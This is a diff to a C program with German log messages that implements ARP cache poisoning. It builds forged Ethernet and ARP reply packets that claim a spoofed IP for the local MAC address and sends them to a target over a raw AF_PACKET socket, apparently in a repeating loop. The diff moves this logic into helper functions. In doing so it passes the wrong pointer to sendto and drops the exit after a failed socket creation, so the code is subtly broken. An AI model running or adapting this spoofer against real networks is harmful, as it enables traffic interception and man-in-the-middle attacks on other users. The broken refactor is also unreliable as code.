@@ -81,6 +81,51 @@ int get_interface_info(const char* ifac_n, unsigned char *local_m_buffer, int *i
     printf("ioctl Socket geschlossen.\n");
     return 0;
 }
+void build_arp_package(struct arp_packet *arp_p, unsigned char *target_mac_bytes, unsigned char *local_mac, const char *spoof_ip_str, const char *target_ip_str){
+
+    memcpy(arp_p->eth_header.h_dest, target_mac_bytes, ETH_ALEN);
+    memcpy(arp_p->eth_header.h_source, local_mac, ETH_ALEN);
+    arp_p->eth_header.h_proto = htons(ETH_P_ARP);
+
+    printf("Ethernet-Header erstellt.\n");
+
+    arp_p->arp_header.ar_hrd = htons(ARPHRD_ETHER);
+    arp_p->arp_header.ar_pro = htons(ETH_P_IP);
+    arp_p->arp_header.ar_hln = ETH_ALEN;
+    arp_p->arp_header.ar_pln = sizeof(struct in_addr);
+    arp_p->arp_header.ar_op = htons(ARPOP_REPLY);
+
+    printf("ARP-Header erstellt.\n");
+
+    memcpy(arp_p->sender_mac, local_mac, ETH_ALEN);
+    arp_p->sender_ip.s_addr = inet_addr(spoof_ip_str);
+
+    memcpy(arp_p->target_mac, target_mac_bytes, ETH_ALEN);
+    arp_p->target_ip.s_addr = inet_addr(target_ip_str);
+
+    printf("ARP-Payload gefüllt.\n");
+}
+
+int send_arp_package(int raw_sockfd, struct arp_packet *arp_p, int if_index, unsigned char *target_mac_bytes){
+    struct sockaddr_ll sa_ll;
+    memset(&sa_ll, 0, sizeof(sa_ll));
+    sa_ll.sll_family = AF_PACKET;
+    sa_ll.sll_protocol = htons(ETH_P_ARP);
+    sa_ll.sll_ifindex = if_index;
+    sa_ll.sll_hatype = ARPHRD_ETHER;
+    sa_ll.sll_pkttype = PACKET_OTHERHOST; // PACKET_OTHERHOST ist hier in Ordnung
+    sa_ll.sll_halen = ETH_ALEN;
+    memcpy(sa_ll.sll_addr, target_mac_bytes, ETH_ALEN);
+
+    if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
+               (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
+        perror("sendto");
+        close(raw_sockfd);
+        return -1;
+    }
+    printf("ARP-Paket gesendet.\n");
+    return 0;
+}
 
 int main(int argc, char *argv[])
 {
@@ -93,10 +138,9 @@ int main(int argc, char *argv[])
     const char* target_ip_str = argv[1];
     const char* spoof_ip_str = argv[2];
 
-    int raw_sockfd;
-    struct ifreq if_idx;
-    struct ifreq if_mac;
+    struct arp_packet arp_p;
 
+    int raw_sockfd;
     int if_index;
     unsigned char local_mac[ETH_ALEN];
     unsigned char target_mac_bytes[ETH_ALEN];
@@ -116,53 +160,20 @@ int main(int argc, char *argv[])
     raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (raw_sockfd == -1) {
         perror("raw_sockfd creation");
-        return 1;
     }
     printf("Raw Socket für ARP-Pakete erstellt.\n");
 
-    get_interface_info(iface_name, local_mac, &if_index);
-
-    struct arp_packet arp_p;
-
-    memcpy(arp_p.eth_header.h_dest, target_mac_bytes, ETH_ALEN);
-    memcpy(arp_p.eth_header.h_source, local_mac, ETH_ALEN);
-    arp_p.eth_header.h_proto = htons(ETH_P_ARP);
-
-    printf("Ethernet-Header erstellt.\n");
-
-    arp_p.arp_header.ar_hrd = htons(ARPHRD_ETHER);
-    arp_p.arp_header.ar_pro = htons(ETH_P_IP);
-    arp_p.arp_header.ar_hln = ETH_ALEN;
-    arp_p.arp_header.ar_pln = sizeof(struct in_addr);
-    arp_p.arp_header.ar_op = htons(ARPOP_REPLY);
-
-    printf("ARP-Header erstellt.\n");
-
-    memcpy(arp_p.sender_mac, local_mac, ETH_ALEN);
-    arp_p.sender_ip.s_addr = inet_addr(spoof_ip_str);
-
-    memcpy(arp_p.target_mac, target_mac_bytes, ETH_ALEN);
-    arp_p.target_ip.s_addr = inet_addr(target_ip_str);
-
-    printf("ARP-Payload gefüllt.\n");
-
-    struct sockaddr_ll sa_ll;
-    memset(&sa_ll, 0, sizeof(sa_ll));
-    sa_ll.sll_family = AF_PACKET;
-    sa_ll.sll_protocol = htons(ETH_P_ARP);
-    sa_ll.sll_ifindex = if_index;
-    sa_ll.sll_hatype = ARPHRD_ETHER;
-    sa_ll.sll_pkttype = PACKET_OTHERHOST; // PACKET_OTHERHOST ist hier in Ordnung
-    sa_ll.sll_halen = ETH_ALEN;
-    memcpy(sa_ll.sll_addr, target_mac_bytes, ETH_ALEN);
-
-    if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
-               (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
-        perror("sendto");
-        close(raw_sockfd);
+    if(get_interface_info(iface_name, local_mac, &if_index) == -1){
+        perror("own-interface-info");
         return 1;
     }
-    printf("ARP-Paket gesendet.\n");
+    
+    build_arp_package(&arp_p, target_mac_bytes, local_mac, spoof_ip_str, target_ip_str);
+   
+    if(send_arp_package(raw_sockfd, &arp_p, if_index, target_mac_bytes) == -1){
+        perror("send");
+        return 1;
+    }
 
     while(1){
          
